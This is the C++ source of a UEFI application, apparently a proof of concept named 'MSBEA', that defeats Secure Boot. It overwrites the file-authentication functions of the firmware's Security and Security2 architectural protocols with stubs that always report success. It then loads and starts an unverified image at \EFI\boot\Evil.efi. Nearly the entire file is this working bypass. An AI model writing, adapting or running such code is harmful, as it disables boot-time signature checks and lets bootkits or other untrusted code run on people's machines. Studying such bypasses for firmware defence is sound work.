extern "C"
{

#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiDriverEntryPoint.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Protocol/LoadedImage.h>
#include <Protocol/Security.h>  //say no security 1
#include <Protocol/Security2.h> //say no security 2
#include <Guid/GlobalVariable.h>

}

#include "LocateFile.hpp"

EFI_STATUS EFIAPI hk_EFI_SECURITY_FILE_AUTHENTICATION_STATE(
  IN  CONST EFI_SECURITY_ARCH_PROTOCOL *This,
  IN  UINT32                           AuthenticationStatus,
  IN  CONST EFI_DEVICE_PATH_PROTOCOL   *File
  )
{
    return EFI_SUCCESS; //yeah, we are protected!
}

EFI_STATUS EFIAPI hk_EFI_SECURITY2_FILE_AUTHENTICATION(
  IN CONST EFI_SECURITY2_ARCH_PROTOCOL *This,
  IN CONST EFI_DEVICE_PATH_PROTOCOL    *File  OPTIONAL,
  IN VOID                              *FileBuffer,
  IN UINTN                             FileSize,
  IN BOOLEAN                           BootPolicy
  )
{
    return EFI_SUCCESS; //yeah, we are protected!
}

EFI_STATUS
EFIAPI
UefiMain(
    IN EFI_HANDLE ImageHandle,
    IN EFI_SYSTEM_TABLE *SystemTable)
{
    gST->ConOut->ClearScreen(gST->ConOut);

    Print((CHAR16 *)L"Welcome to MSBEA!\n");
    Print((CHAR16 *)L"Make Secure Boot Enabled Again!\n");

    {
        UINT8 SecureBoot;
        UINTN DataSize;
        if (EFI_ERROR(gRT->GetVariable((CHAR16 *)L"SecureBoot", &gEfiGlobalVariableGuid, NULL, &DataSize, &SecureBoot)))
        {
            SecureBoot = 0;
        }
        Print((CHAR16 *)L"SecureBoot status: %s\n", SecureBoot ? (CHAR16 *)L"On" : (CHAR16 *)L"Off");
    }
    {
        EFI_SECURITY_ARCH_PROTOCOL* SecurityProto;
        if(EFI_ERROR(gBS->LocateProtocol(&gEfiSecurityArchProtocolGuid,NULL,(void**)&SecurityProto))){
            Print((CHAR16*)L"Failed to locate EFI_SECURITY_ARCH_PROTOCOL!\n");
        }
        else{
            //we found that, time to spoof
            Print((CHAR16*)L"Founded EFI_SECURITY_ARCH_PROTOCOL!\nSpoofing EFI_SECURITY_ARCH_PROTOCOL...\n");
            SecurityProto->FileAuthenticationState = (EFI_SECURITY_FILE_AUTHENTICATION_STATE)&hk_EFI_SECURITY_FILE_AUTHENTICATION_STATE;
        }
    }
    {
        EFI_SECURITY2_ARCH_PROTOCOL* SecurityProto;
        if(EFI_ERROR(gBS->LocateProtocol(&gEfiSecurity2ArchProtocolGuid,NULL,(void**)&SecurityProto))){
            Print((CHAR16*)L"Failed to locate EFI_SECURITY2_ARCH_PROTOCOL!\n");
        }
        else{
            //we found that, time to spoof
            Print((CHAR16*)L"Founded EFI_SECURITY2_ARCH_PROTOCOL!\nSpoofing EFI_SECURITY2_ARCH_PROTOCOL...\n");
            SecurityProto->FileAuthentication = (EFI_SECURITY2_FILE_AUTHENTICATION)&hk_EFI_SECURITY2_FILE_AUTHENTICATION;
        }
    }
    EFI_DEVICE_PATH* evil_file_path;
    if(Boot::LocateFile((CHAR16*)L"\\EFI\\boot\\Evil.efi",evil_file_path) != EFI_SUCCESS){
        Print((CHAR16*)L"\\EFI\\boot\\Evil.efi not found!\n");
        return -1;
    }
    EFI_HANDLE evil_file_handle;
    if(gBS->LoadImage(TRUE, //we are booting directly
                    ImageHandle,
                    evil_file_path,
                    0,
                    0,
                    &evil_file_handle) != EFI_SUCCESS)
    {
        Print((CHAR16*)L"Failed to load \\EFI\\boot\\Evil.efi\n");
        return -1;
    }
    Print((CHAR16*)L"Starting \\EFI\\boot\\Evil.efi ...\n");
    gBS->Stall(3000000);
    if(gBS->StartImage(evil_file_handle,nullptr,nullptr) != EFI_SUCCESS){
        Print((CHAR16*)L"Failed to start \\EFI\\boot\\Evil.efi\n");
        return -1;
    }

    return EFI_SUCCESS;
}